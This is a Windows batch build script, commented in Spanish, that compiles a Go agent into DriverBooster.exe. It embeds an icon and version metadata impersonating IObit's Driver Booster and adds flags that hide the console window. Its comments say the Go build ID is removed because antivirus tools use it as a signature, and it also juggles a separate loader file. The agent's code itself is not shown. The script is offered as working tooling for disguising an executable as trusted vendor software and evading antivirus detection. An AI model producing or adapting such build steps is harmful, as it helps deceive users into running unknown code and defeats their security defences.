@echo off
REM build.bat — Compila DriverBooster.exe con icono y flags de evasión
REM ===================================================================
REM Uso: doble clic o ejecutar en terminal: build.bat
REM Requisitos: Go instalado + goversioninfo
REM   go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest
REM
REM Flujo:
REM   1. Genera resource.syso con el icono (driverbooster.ico) y metadatos
REM      de version (CompanyName=IObit, FileDescription=Driver Booster Update Agent)
REM   2. Oculta loader.go temporalmente (tiene otro package main que choca)
REM   3. Compila agent.go con Go generando dist\DriverBooster.exe
REM   4. Restaura loader.go y limpia archivos temporales
REM
REM Flags de compilacion:
REM   -s          : elimina tabla de simbolos (binario mas pequeño)
REM   -w          : elimina DWARF debug info
REM   -H windowsgui : modo ventana (sin consola al ejecutar)
REM   -buildid=   : elimina el build ID de Go (firma que usan los AV)
REM   -trimpath   : elimina rutas del sistema de archivos del binario
REM
REM Output:
REM   dist\DriverBooster.exe  — binario compilado con icono embebido
REM
REM Nota: Si da error "too many .rsrc sections", borrar archivos .syso
REM       viejos antes de compilar.
REM ===================================================================

echo [*] Paso 1/4 — Generando recurso con icono y version info...
goversioninfo -platform-specific versioninfo.json
if %errorlevel% neq 0 (
    echo [ERROR] Fallo goversioninfo. Instalalo con:
    echo   go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest
    exit /b 1
)

echo [*] Paso 2/4 — Ocultando loader.go (evita duplicado de main())...
ren loader.go loader.go.bak 2>nul

echo [*] Paso 3/4 — Compilando DriverBooster.exe con Go...
go build -ldflags="-s -w -H windowsgui -buildid=" -trimpath -o dist\DriverBooster.exe .
if %errorlevel% neq 0 (
    echo [ERROR] Fallo la compilacion. Verifica que Go este instalado.
    ren loader.go.bak loader.go 2>nul
    exit /b 1
)

echo [*] Paso 4/4 — Restaurando loader.go y limpiando temporales...
ren loader.go.bak loader.go 2>nul
del resource_windows_*.syso 2>nul

echo.
if exist "dist\DriverBooster.exe" (
    echo ========================================
    echo [OK] Compilacion exitosa!
    echo [*] Archivo: dist\DriverBooster.exe
    for %%I in ("dist\DriverBooster.exe") do echo [*] Tamano: %%~zI bytes
    echo ========================================
) else (
    echo [ERROR] No se genero el ejecutable. Revisa los mensajes de arriba.
    exit /b 1
)
